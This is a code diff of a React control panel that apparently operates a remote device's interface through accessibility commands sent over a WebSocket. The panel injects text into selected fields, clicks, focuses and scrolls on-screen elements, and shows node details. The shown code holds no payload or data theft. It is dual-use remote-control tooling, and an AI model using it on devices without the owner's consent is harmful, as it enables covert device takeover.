+          <div className="flex gap-2">
+            <input
+              value={typeText}
+              onChange={e => setTypeText(e.target.value)}
+              onKeyDown={e => {
+                if (!selectedNode) return
+                e.stopPropagation()
+                if (e.key === 'Enter') {
+                  ws.sendCommand(deviceId, { action: 'PERFORM_NODE_ACTION', node_id: selectedNode.id, action_type: 'CLICK', bounds: selectedNode.b })
+                  return
+                }
+                ws.sendCommand(deviceId, { action: 'ACCESSIBILITY_SET_TEXT', node_id: selectedNode.id, text: e.target.value })
+              }}
+              placeholder="Type text to inject into selected field..."
+              className="input flex-1 text-xs"
+            />
+            <button
+              onClick={() => {
+                if (selectedNode && typeText) {
+                  ws.sendCommand(deviceId, { action: 'ACCESSIBILITY_SET_TEXT', node_id: selectedNode.id, text: typeText })
+                }
+              }}
+              className="btn-info text-xs"
+            >
+              INJECT TEXT
+            </button>
+            <button
+              onClick={() => {
+                setTypeText('')
+                if (selectedNode) ws.sendCommand(deviceId, { action: 'ACCESSIBILITY_SET_TEXT', node_id: selectedNode.id, text: '' })
+              }}
+              className="btn-outline text-xs"
+            >
+              CLEAR
+            </button>
+          </div>
+        </div>
+      )}
+
+      {/* ── Selected Node Info (INFO mode) ───────────────── */}
+      {mode === 'info' && selectedNode && (
+        <div className="card space-y-1.5">
+          <p className="section-header">SELECTED NODE</p>
+          {[
+            ['ID',         selectedNode.id],
+            ['CLASS',      selectedNode.cls],
+            ['TEXT',       selectedNode.text || '—'],
+            ['HINT',       selectedNode.hint || '—'],
+            ['DESC',       selectedNode.desc || '—'],
+            ['BOUNDS',     selectedNode.b ? `[${selectedNode.b.join(', ')}]` : '—'],
+            ['CLICKABLE',  String(selectedNode.clickable ?? false)],
+            ['EDITABLE',   String(selectedNode.edit ?? false)],
+            ['FOCUSED',    String(selectedNode.focus ?? false)],
+            ['SCROLLABLE', String(selectedNode.scroll ?? false)],
+            ['ENABLED',    String(selectedNode.en ?? true)],
+          ].map(([k, v]) => (
+            <div key={k} className="flex items-center gap-2">
+              <span className="label w-24 flex-shrink-0">{k}</span>
+              <span className="font-mono text-xs text-textPrimary truncate">{v}</span>
+            </div>
+          ))}
+          <div className="flex gap-1.5 pt-1 flex-wrap">
+            <button
+              onClick={() => ws.sendCommand(deviceId, { action: 'PERFORM_NODE_ACTION', node_id: selectedNode.id, action_type: 'CLICK', bounds: selectedNode.b })}
+              className="btn-gold text-xs"
+            >⚡ CLICK</button>
+            <button
+              onClick={() => ws.sendCommand(deviceId, { action: 'PERFORM_NODE_ACTION', node_id: selectedNode.id, action_type: 'LONG_CLICK', bounds: selectedNode.b })}
+              className="btn-outline text-xs"
+            >LONG CLICK</button>
+            <button
+              onClick={() => ws.sendCommand(deviceId, { action: 'PERFORM_NODE_ACTION', node_id: selectedNode.id, action_type: 'FOCUS', bounds: selectedNode.b })}
+              className="btn-outline text-xs"
+            >FOCUS</button>
+            <button
+              onClick={() => ws.sendCommand(deviceId, { action: 'PERFORM_NODE_ACTION', node_id: selectedNode.id, action_type: 'SCROLL_FWD', bounds: selectedNode.b })}
+              className="btn-outline text-xs"
+            >SCROLL ↓</button>
+          </div>
+        </div>
+      )}
+
+      {/* ── Legend ──────────────────────────────────────────── */}
+      <div className="flex gap-3 flex-wrap">
+        {[
+          ['EditText',   '#3b82f6'],
+          ['Button',     '#d4a017'],
+          ['CheckBox',   '#14b8a6'],
+          ['Focused',    '#22d36e'],
+          ['Scroll',     '#374151'],
         ].map(([label, color]) => (
-          <span key={label} style={{ fontSize: 9, padding: '2px 7px', borderRadius: 5,
-            background: 'var(--bg3)', color, fontWeight: 600 }}>
+          <div key={label} className="flex items-center gap-1.5 text-[10px] font-mono text-textMuted">
+            <span className="w-2.5 h-2.5 rounded-sm border" style={{ borderColor: color, background: color + '33' }} />
             {label}
-          </span>
+          </div>
         ))}
       </div>
     </div>
-  );
-}
-
-// ── Mini helper components ─────────────────────────────────────────────────────
-const bool = v => v ? 'true' : 'false';
-
-function SectionHdr({ icon, label }) {
-  return (
-    <div style={{ display: 'flex', alignItems: 'center', gap: 6, margin: '12px 0 6px' }}>
-      <span style={{ fontSize: 13 }}>{icon}</span>
-      <span style={{ fontSize: 10, fontWeight: 800, color: 'var(--gold)', letterSpacing: 1 }}>{label}</span>
-      <div style={{ flex: 1, height: 1, background: 'var(--gold-border)' }} />
-    </div>
-  );
-}
-
-function CtrlBtn({ label, state, onClick }) {
-  return (
-    <div onClick={onClick} style={{ background: 'rgba(30,20,5,.8)',
-      border: '1px solid var(--gold-border)', borderRadius: 10,
-      padding: '8px 14px', marginBottom: 6, cursor: 'pointer',
-      display: 'flex', alignItems: 'center', gap: 8 }}>
-      {state != null && (
-        <span style={{ fontSize: 9, padding: '1px 6px', borderRadius: 4,
-          background: state === 'true' ? 'rgba(0,200,100,.15)' : 'var(--bg3)',
-          color: state === 'true' ? '#00c864' : 'var(--text3)', fontWeight: 600 }}>
-          {state}
-        </span>
-      )}
-      <span style={{ fontSize: 11, fontWeight: 700, color: 'var(--gold)', letterSpacing: .5 }}>{label}</span>
-      <span style={{ marginLeft: 'auto', fontSize: 12, color: 'var(--text3)' }}>›</span>
-    </div>
-  );
+  )
 }
